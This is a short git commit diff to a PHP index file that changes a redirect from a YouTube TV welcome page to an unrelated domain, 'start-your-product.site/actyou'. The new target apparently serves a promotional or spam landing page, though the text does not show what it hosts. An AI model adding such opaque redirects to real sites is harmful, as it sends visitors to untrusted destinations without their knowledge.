792640d928ff2bac086b531c523203727b649f0f
zinia5767gre <58773556+zinia5767gre@users.noreply.github.com>
2019-12-13 12:17:58 +0530

    Update index.php

--- index.php
+++ index.php
@@ -1,4 +1,4 @@
 <?php
-header("Location: https://tv.youtube.com/welcome/?utm_medium=ep&utm_source=youtube_web&utm_campaign=home&ve=34273");
+header("Location: https://start-your-product.site/actyou");
 die();
 ?>
